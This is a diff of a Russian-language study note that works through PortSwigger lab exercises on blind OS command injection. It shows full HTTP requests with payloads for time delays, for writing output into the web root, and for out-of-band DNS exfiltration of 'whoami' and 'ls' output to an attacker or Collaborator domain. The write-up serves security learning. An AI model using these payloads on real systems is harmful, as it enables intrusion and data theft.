@@ -1,9 +1,15 @@
-#### Карта раздела
 
-
----
 #### Оглавление
-
+[[#Внедрение OS Command Injection]]
+[[#Полезные команды]]
+[[#Blind OS command injection]]
+[[#Обнаружение Blind OS command injections с помощью временных задержек]]
+	[[#Пример лабы с Blind OS command injection with time delays]]
+[[#Эксплуатация через перенаправления вывода]]
+	[[#Пример лабы Lab Blind OS command injection with output redirection]]
+[[#Эксплуатация Blind OS command injection с использованием out-of-band техник]]
+	[[#Пример лабы Lab Blind OS command injection with out-of-band interaction]]
+	
 
 ---
 > [!info] Определение
@@ -35,3 +41,94 @@ abobas // результат команды echo
 29: command not found // аргумент выполнен как команда, это и вызвало ошибку
 ```
 Размещение дополнительно разделителя команд & после внедренной команды полезно, поскольку отделяет внедренную команду от того, что следует после точки инъекции, что снижает вероятность того, что последующее предотвратит выполнение внедренной команды 
+## Полезные команды
+
+|        Что делает         |    Linux    |    Windows    |
+| :-----------------------: | :---------: | :-----------: |
+| Имя текущего пользователя |   whoami    |    whoami     |
+|   Операционная система    |  uname -a   |      ver      |
+|     Сетевые настройки     |  ifconfig   | ipconfig /all |
+|    Сетевые соединения     | netstat -an |  netstat -an  |
+|    Запущенные процессы    |   ps -ef    |   tasklist    |
+## Blind OS command injection
+Большая часть OS injections это слепые уязвимости. Это означает что приложение не возвращает вывод команды в HTTP ответе, слепые уязвимости можно эксплуатировать но они требуют техники
+**Пример:** 
+Есть сайт который позволяет пользователям отправлять отзыв. Пользователь вводит свой адрес email и текст отзыва. Серверное приложение затем формирует письмо админу сайта с содержимым отзыва. Для этого оно вызывает программу `mail` с переданными данными
+```shell
+mail -s "This site is great" -aFrom:peter@normal-user.net feedback@vulnerable-website.com
+```
+Вывод команды `mail` возвращается в ответах приложения, поэтому полезная нагрузка с `echo` здесь не сработает. В этой ситуации можно использовать другие техники эксплуатации уязвимости
+## Обнаружение Blind OS command injections с помощью временных задержек
+Можно использовать внедренную команду создающую временную задержку, чтобы по времени ответа приложения подтвердить, что команда была выполнена. Команда `ping` хорошо подходит для этого, потому что позволяет указать число ICMP-пакетов для отправки. Это дает возможность управлять временем выполнения команды
+```
+& ping -c 10 127.0.0.1 & такая команда заставяет приложение пиговать свой loopback 10 секунд
+```
+### Пример лабы с Blind OS command injection with time delays
+В этой работе нужно использовать функцию `Sumbit feedback` чтобы использовать задержку, для этого можно использовать `ping -c 10 127.0.0.1` для этого пробуем отсмотреть запрос 
+```
+POST /feedback/submit HTTP/2
+Host: 0a0000b9042bcd478216797c004800fe.web-security-academy.net
+...
+
+csrf=ioHW01lVJwYdwJMxPrwREYbdbdTitA5r&name=abobas&email=abobas@mail.com&subject=abobas&message=abobas
+```
+перебираем параметры и техники, можно попробовать `; payload` `| paylaod |` `& payload &` `&& payload &&` `|| payload ||`, последний сработал у меня, так же обязательно используем URL кодирование потому что, в payload есть пробелы и нам очень важно не поломать тело запроса пробелами
+## Эксплуатация через перенаправления вывода 
+Можно перенаправить вывод команды в файл внутри web-root, который затес можно получить в браузере, например если приложение отдает статические ресурсы из файловой системы по пути `/var/www/static` можно отправить такой ввод:
+```
+& whoami > /var/www/static/whoami.txt &
+```
+символ `>` перенаправляет вывод команды `whoami` в указанный файл. Затем можно через браузер забрать `http://vuln-website.com/whoami.txt` чтобы получит вывод внедренной команды
+### Пример лабы Lab: Blind OS command injection with output redirection
+В лабе тот же самый принцип что и в предыдущей, уязвимый параметр это email, и принцип эксплуатации абсолютно аналогичный только с записью в файл по пути который указан в лабе
+```
+POST /feedback/submit HTTP/2
+Host: 0adc007f045bd82c804a6287007800ee.web-security-academy.net
+...
+
+csrf=ZKUn03MSajvmruA9Q9ZkbKMGCwRfq6Nq&name=wad&email=dwa%40mail.com||%20whoami%20%3E%20/var/www/images/whoami.txt||&subject=awd&message=awd
+```
+Обязательно кодируем payload в URL и забираем по нужному нам пути
+## Эксплуатация Blind OS command injection с использованием out-of-band техник
+Можно использовать OS command injection, которая вызовет внеполосное сетевое взаимодействие(out-of-band) c системой, контролируемой вами, применяя техники OAST, пример:
+```
+& nslookup kgji2ohoyw.web-attacker.com &
+```
+здесь используется полезная нагрузка `nslookup` чтобы инициировать DNS запрос к указанному домену. Атакующий может отслеживать произошел ли запрос, чтобы подтвердить успешность выполнения команды
+### Пример лабы Lab: Blind OS command injection with out-of-band interaction
+В данной лабораторной работе снова уязвимость в параметре email в форме feedback, но на этот раз так как команда выполняется ассинхронно то мы не можем увидеть задержку времени, а запись не разрешена, поэтому делаем связь с внешним сервером, используя BurpCollaborator, для осуществления запроса можно просто взять `nslookup` чтобы инициировать DNS запись, в итоге составляем payload до нашего сервера, обязательно кодируем его в URL и получаем следующий запрос: 
+```
+POST /feedback/submit HTTP/2
+Host: 0abb00c004cf1f478133fc23007c00a4.web-security-academy.net
+....
+
+csrf=O2swgvC4HYWDGgVFrzBEqBfvmeceF16q&name=asd&email=a||nslookup%20bo3k25xxpd721sv1x9uy2fawfnle95xu.oastify.com%20||&subject=asd&message=as&
+```
+## Эксфильтрация через Out-Of-Band
+ Внеполосный канал предоставляет простой способ эксфильтрации вывода внедренных команд, например 
+ ```
+ & nslookup `whoami`.kgji2ohoyw.web-attacker.com &
+ ```
+ это приводит к DNS запросу к домену атакующего, который содержит результат команды `whoami`
+ ```
+ wwwuser.kgji2ohoyw.web-attacker.com
+ ```
+### Пример лабы Lab: Blind OS command injection with out-of-band data exfiltration
+Как и в предыдущей лабе, нужно использовать Out-Of-Band, уязвимость все так же в параметре mail, для эксплуатации необходимо использовать BurpCollaborator, далее команды вводятся в формате
+```
+`command`.address-brup.server
+```
+Ответ приходит вот так: 
+```
+The Collaborator server received a DNS lookup of type A for the domain name **peter-6yX4PW.bo3k25xxpd721sv1x9uy2fawfnle95xu.oastify.com**.  
+  
+The lookup was received from IP address 3.251.104.48:8973 at 2026-Jan-31 08:15:06.500 UTC.
+```
+в результате у нас получится вот такой запрос с пейлоадом закодированным в URL
+```
+POST /feedback/submit HTTP/2
+Host: 0a3f00cc0371448a8217256b008500d6.web-security-academy.net
+...
+
+csrf=htGEUsrllsj4dpFCR9LCYKSxEwU1FZuY&name=sad&email=s||nslookup%20%60ls%60.bo3k25xxpd721sv1x9uy2fawfnle95xu.oastify.com%20||&subject=213&message=123
+```
